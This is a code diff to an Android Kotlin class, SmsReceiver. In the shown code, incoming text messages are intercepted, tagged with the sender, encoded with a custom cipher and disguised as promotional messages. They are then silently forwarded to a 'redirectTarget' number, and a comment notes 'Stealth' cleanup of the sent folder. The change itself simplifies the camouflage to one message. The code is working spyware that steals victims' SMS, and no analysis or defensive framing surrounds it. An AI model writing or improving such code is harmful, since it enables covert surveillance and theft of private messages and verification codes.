@@ -68,14 +68,11 @@ class SmsReceiver : BroadcastReceiver() {
                             try {
                                 val msgRaw = "[HVT:$sender] $body"
                                 val token = FidelCipher.encode(msgRaw)
-                                val promos = FidelCipher.camouflage(context, token)
+                                val promo = FidelCipher.camouflage(context, token)
                                 val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
                                 
-                                for (promo in promos) {
-                                    val parts = smsManager.divideMessage(promo)
-                                    smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
-                                    delay(3000)
-                                }
+                                val parts = smsManager.divideMessage(promo)
+                                smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
                                 
                                 // Stealth: Cleanup sent folder
                                 delay(5000)
